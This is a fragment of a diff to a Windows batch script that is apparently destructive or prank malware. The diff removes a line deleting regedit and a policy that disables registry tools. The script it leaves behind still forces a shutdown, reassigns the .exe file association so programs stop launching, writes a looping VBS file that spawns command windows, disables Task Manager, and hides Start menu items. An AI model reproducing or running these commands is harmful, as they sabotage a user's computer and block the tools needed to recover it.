@@ -61,7 +61,6 @@ timeout 60 /nobreak
  
 Shutdown.exe /s /t 120
  
-Del "C:\Windows\System32/regedit" /s /q /f
 
 assoc .exe=.Ink
 
@@ -142,8 +141,6 @@ echo execute"S.Run ""%comspec% /c echo "" & Chr(7), 0, True">>%temp%\temp2.vbs
 echo loop>>%temp%\temp2.vbs 
 
 reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v disabletaskmgr /t REG_DWORD /d 1 /f 
-
-reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v disableregistrytools /t REG_DWORD /d 1 /f 
 
 reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoStartMenuPinnedList /t REG_DWORD /d 1 /f 
 
